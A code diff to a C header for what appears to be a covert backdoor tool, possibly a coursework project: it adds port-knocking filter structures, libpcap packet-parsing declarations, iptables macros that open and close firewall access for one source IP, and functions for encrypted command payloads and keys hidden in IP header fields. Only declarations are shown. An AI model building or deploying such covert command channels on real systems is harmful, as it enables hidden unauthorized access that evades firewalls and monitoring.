@@ -22,7 +22,7 @@
 #include "encrypt_utils.h"
 #include "socketwrappers.h"
 #include "covert_wrappers.h"
-#include "portknocking.h"
+//#include "portknocking.h"
 #include "inotify.h"
 #include <unistd.h>
 #include <time.h>
@@ -83,17 +83,42 @@ struct payload{
     char buffer[1024]; // for either commands or results
 };
 
-struct filter Filter;
+//struct filter Filter;
 
+
+#define TCP "tcp and ("
+#define OR " || "
+#define PORTS "port"
+#define END ")"
+#define FILTERAMOUNT 2
+#define IPTABLES(ip,protocol,port) "iptables -I INPUT -p " protocol " -s " ip " --dport " port " -j ACCEPT"
+#define TURNOFF(ip,protocol,port) "iptables -D INPUT -p " protocol "  -s " ip " --dport " port " -j ACCEPT"
+#include "libpcap.h"
+
+struct filter{
+    int amount;
+    const char *port[FILTERAMOUNT];
+    unsigned short port_short[FILTERAMOUNT];
+    unsigned short port_ushort[FILTERAMOUNT];
+    char targetip[BUFSIZE];
+    char localip[BUFSIZE];
+    int pattern[FILTERAMOUNT];
+};
+
+struct filter InitFilter(char *target, char *local);
+void PrintFilter(struct filter Filter);
+void CreateFilter(struct filter Filter, char *buffer);
+void PortKnocking(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool send, struct filter Filter);
+void SendPattern(unsigned char *data, struct filter Filter);
 //char GetLocalIP(char *device);
 char* iptables(char *port, char *ip, char *protocol);
-int Packetcapture(char *filter);
+int Packetcapture(char *filter, struct filter Filter);
 void ReadPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
-void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
-void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
-void ParsePayload(const u_char *payload, int len);
+void ParseIP(struct filter *Filter,const struct pcap_pkthdr* pkthdr, const u_char* packet);
+void ParseTCP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet);
+void ParsePayload(struct filter *Filter, const u_char *payload, int len);
 void CreatePayload(char *command, unsigned char *encrypted);
-void SendPayload(const unsigned char *tcp_payload);
+void SendPayload(struct filter *Filter, const unsigned char *tcp_payload);
 bool CheckKey(u_char ip_tos, u_short ip_id, bool type);
 pcap_t *interfaceinfo;
 
